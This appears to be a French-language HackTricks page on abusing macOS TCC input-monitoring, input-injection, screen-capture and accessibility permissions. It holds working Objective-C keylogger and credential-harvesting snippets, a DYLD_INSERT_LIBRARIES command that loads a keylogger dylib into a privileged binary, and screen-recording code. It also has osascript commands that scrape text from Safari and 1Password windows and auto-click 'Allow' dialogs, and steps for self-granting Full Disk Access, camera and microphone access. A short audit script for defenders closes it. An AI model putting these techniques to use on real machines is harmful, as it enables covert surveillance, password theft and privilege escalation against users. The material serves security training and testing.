# Abus de la surveillance des entrées, de la capture d’écran et de l’accessibilité sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Trois services TCC associés contrôlent la manière dont les applications peuvent observer et utiliser la session de bureau de l’utilisateur :

| Service TCC | Permission | Capacité |
|---|---|---|
| `kTCCServiceListenEvent` | **Surveillance des entrées** | Lire tous les événements clavier et souris à l’échelle du système (keylogging) |
| `kTCCServicePostEvent` | **Injection d’entrées** | Injecter des événements clavier et souris synthétiques |
| `kTCCServiceScreenCapture` | **Capture d’écran** | Lire le buffer d’affichage, prendre des captures d’écran et enregistrer l’écran |
| `kTCCServiceAccessibility` | **Accessibilité** | Contrôler d’autres applications via l’API AXUIElement et lire les éléments d’interface utilisateur |

Ces permissions constituent **la combinaison la plus dangereuse sur macOS** : ensemble, elles permettent :
- D’effectuer un keylogging complet de chaque frappe (mots de passe, messages, cartes bancaires)
- D’enregistrer tout le contenu visible à l’écran
- D’injecter des entrées synthétiques (cliquer sur des boutons et approuver des boîtes de dialogue)
- De contrôler entièrement l’interface graphique, comme avec un accès physique

---

## Surveillance des entrées (kTCCServiceListenEvent)

### Fonctionnement

macOS utilise l’API **`CGEventTap`** pour permettre aux processus d’intercepter les événements d’entrée provenant du système d’événements Quartz. Un processus disposant de la permission ListenEvent peut créer un event tap qui reçoit **chaque événement clavier et souris** avant ou après sa transmission à l’application cible.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Recherche de binaires dotés d’entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Si un binaire disposant de l’autorisation ListenEvent a également la **validation des bibliothèques désactivée** ou **autorise les variables d’environnement DYLD**, un attaquant peut injecter une dylib qui enregistre un CGEventTap :
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
La dylib injectée hérite de l’autorisation TCC ListenEvent de la cible et capture toutes les frappes au clavier.

### Attack: Credential Harvesting

Un keylogger sophistiqué peut corréler les frappes au clavier avec l’application active :
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Injection d'entrées (kTCCServicePostEvent)

### Fonctionnement

La permission PostEvent permet de créer un event tap avec **`kCGEventTapOptionDefault`** (peut modifier/injecter des événements) au lieu de ListenOnly.<sup>[[1]](#references)</sup> Cela permet de :
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Attack: Automated TCC Prompt Approval

Avec PostEvent, un attaquant peut **simuler un clic sur « Autoriser »** dans les boîtes de dialogue d’autorisation TCC :
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Capture d'écran (kTCCServiceScreenCapture)

### Fonctionnement

L'autorisation de capture d'écran permet de lire le tampon d'affichage à l'aide de :
- **`CGWindowListCreateImage`** — capturer n'importe quelle fenêtre ou l'écran entier
- **`ScreenCaptureKit`** (macOS 12.3+) — API moderne pour diffuser le contenu de l'écran<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — capture d'écran accélérée par le matériel
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Trouver les clients de capture d'écran
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attaque : Capture d’identifiants via OCR

Un processus de capture d’écran injecté peut capturer périodiquement des images et utiliser l’OCR pour extraire des mots de passe :
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> À partir de **macOS Sonoma**, la capture d'écran affiche un **indicateur persistant** dans la barre des menus. Sur les versions antérieures, l'enregistrement de l'écran pouvait être totalement silencieux. Toutefois, une brève capture d'une seule image peut toujours passer inaperçue aux yeux des utilisateurs.

### Attack: Session Recording

L'enregistrement continu de l'écran fournit une relecture complète de la session de l'utilisateur :
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibilité (kTCCServiceAccessibility)

### Fonctionnement

L’accès à l’accessibilité permet de contrôler d’autres applications via l’**AXUIElement API**.<sup>[[2]](#references)</sup> Un processus disposant de l’accès à l’accessibilité peut :

1. **Lire** n’importe quel élément d’interface utilisateur dans n’importe quelle application (champs de texte, libellés, boutons, menus)
2. **Cliquer** sur des boutons et interagir avec des contrôles
3. **Saisir** du texte dans n’importe quel champ de texte
4. **Naviguer** dans les menus et les boîtes de dialogue
5. **Scrape** les données affichées par n’importe quelle application en cours d’exécution
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

L’abus le plus dangereux de l’accessibility consiste à **parcourir les Réglages Système afin d’accorder à votre propre malware des autorisations supplémentaires** :
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attaque : Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attaque : Actions utilisateur automatisées
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Chaînes d'attaque

### Chaîne : Surveillance des entrées + Capture d'écran = Surveillance complète
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chaîne : Accessibilité + PostEvent = Contrôle à distance total
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chaîne : Accessibilité → Auto-attribution de l’accès à la caméra/au micro → Surveillance
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Détection et énumération
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Références

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Abuse de l'accessibilité comme contournement de TCC](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
